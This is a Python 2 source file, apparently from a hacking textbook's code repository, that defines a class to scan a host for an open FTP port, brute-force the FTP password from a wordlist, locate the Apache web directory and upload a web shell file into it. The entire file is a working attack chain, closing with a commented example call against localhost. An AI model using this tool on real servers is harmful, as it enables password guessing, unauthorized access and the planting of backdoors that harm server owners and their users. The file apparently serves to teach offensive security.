"""
https://github.com/Sotaneum/Book-Python-Hacking
LEE DONG GUN 2015-06-13
"""

from ftplib import FTP
import sys
import os
import socket
import nmap
import string

class WebShell:
    def CheckPW(self,u_id,u_pw,ip):
        try:
            ftp=FTP(ip)
            ftp.login(u_id,u_pw)
            print "user password:",u_pw
            return u_pw
        except Exception:
            return False
        
    def getDirList(self,cftp,name):
        dirList=[]
        if("." not in name):
            if(len(name)==0):
                dirList = cftp.nlst()
            else:
                dirList = cftp.nlst(name)
        return dirList
    
    def checkApache(self,dirName1,dirName2,apacheDir):
        if(dirName1.lower().find(apacheDir) >= 0):
            print dirName1
        if(dirName2.lower().find(apacheDir) >=0):
            print dirName1 + "/" + dirName2

    def getPW(self,user_login,ip,wordUrl):
        wordlist =open(wordUrl,'r')
        passwords = wordlist.readlines()
        PW=""
        Check=False
        for password in passwords:
            password = password.strip()
            print "Check password:",password
            PW=self.CheckPW(user_login,password,ip)
            if(PW):
                Check=True
                break
        wordlist.close()
        if(Check):
            return PW
        else:
            return False

    def PortScanner(self,ip):
        nm=nmap.PortScanner()
        nm.scan(ip,'21')
        for host in nm.all_hosts():
            print('-------------------------------------------------')
            print('Host : {0} ({1})'.format(host,nm[host].hostname()))
            print('State : {0}'.format(nm[host].state()))

            for proto in nm[host].all_protocols():
                print('--------------')
                print('Protocol : {0}'.format(proto))

                lport = list (nm[host][proto].keys())
                lport.sort()
                for port in lport:
                    print('port : {0}\tstate : {1}'.format(port,nm[host][proto][port]))
                    if(port==21):
                        print("21 Open!!")
                        print('-------------------------------------------------')
                        return True
            print('-------------------------------------------------')
        return False

    def getDir(self,u_id,u_pw,ip,u_dir=""):
        apacheDir = u_dir
        serverName = ip
        serverID = u_id
        serverPW = u_pw
        ftp=FTP(serverName,serverID,serverPW)

        dirList1 = self.getDirList(ftp, "")
        for name1 in dirList1:
            self.checkApache (name1,"",apacheDir)
            dirList2 = self.getDirList(ftp,name1)
            for name2 in dirList2:
                self.checkApache(name1,name2,apacheDir)
                
    def UploadWebShell(self,apacheDir,serverName,serverID,serverPW,UploadFileUrl):
        try:
            ftp = FTP(serverName,serverID,serverPW)

            ftp.cwd(apacheDir)

            fp=open(UploadFileUrl,"rb")
            ftp.storbinary("STOR "+UploadFileUrl,fp)
            fp.close()
            ftp.quit()
            return True
        except:
            return False

    def install_input(self):
        print "connect ip = "
        u_ip=input()
        if(self.PortScanner(u_ip)==True):
            print "connect ID>>"
            u_id=input()
            print "connect WordlistUrl>>"
            u_url=input()
            PW=self.getPW(u_id,u_ip,u_url)
            if PW!=False :
                print "Get PW!!!"
                self.getDir(u_id,PW,u_ip)
                print "Select Dir>>"
                Upload_dir=input()
                print "Select Upload File>>"
                Upload_File=input()
                Chekc=self.UploadWebShell(Upload_dir,u_ip,u_id,PW,Upload_File)
                if(Chekc):
                    print "Good!"
                    return True
                else :
                    print "No!!!!"
                    return False

    def install_Auto(self,u_ip,u_id,u_url,u_uploadfile,u_dir=""):
        if(self.PortScanner(u_ip)==True):
            PW=self.getPW(u_id,u_ip,u_url)
            if PW!=False :
                print "Get PW!!!"
                self.getDir(u_id,PW,u_ip)
                Chekc=self.UploadWebShell(u_dir,u_ip,u_id,PW,u_uploadfile)
                if(Chekc):
                    print "Good!"
                    self.getDir(u_id,PW,u_ip)
                    return True
                else :
                    print "No!!!!"
                    return False

"""

webshell = WebShell()
#                      Server IP , USER ID,   PASSWARD LIST,  UPLOAD FILE
webshell.install_Auto("127.0.0.1","sotaneum","wordlist.txt","webshell.php")

"""
